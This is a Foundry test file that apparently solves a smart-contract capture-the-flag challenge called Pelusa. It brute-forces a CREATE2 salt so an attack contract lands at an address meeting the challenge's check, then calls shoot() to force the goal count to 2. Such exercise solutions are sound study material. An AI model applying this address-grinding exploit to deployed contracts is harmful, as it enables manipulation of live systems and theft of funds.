// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Pelusa.sol";
import "../src/AttackContract.sol";

contract CounterTest is Test {
    Pelusa public pelusa;
    // AttackContract public attackContract;
    address public deployer;
    address public hacker;
    bytes32 public salt;

    function setUp() public {
        deployer = makeAddr("deployer");
        hacker = makeAddr("hacker");

        vm.prank(deployer);
        pelusa = new Pelusa();
    }

    function testHack() public {
        vm.startPrank(hacker);
        while (true) {
            try new AttackContract{salt: salt}(pelusa, deployer) returns (AttackContract attackContract) {
                if (uint256(uint160(address(attackContract))) % 100 == 10) {
                    console.log("salt found: ");
                    console.logBytes32(salt);
                    break;
                }
            }
            catch {
                salt = bytes32(uint256(salt) + 1);
            }
        }
        console.log("goals before shoot(): ", pelusa.goals());
        pelusa.shoot();
        console.log("goals after shoot(): ", pelusa.goals());
        vm.stopPrank();

        assertEq(pelusa.goals(), 2);
    }
}
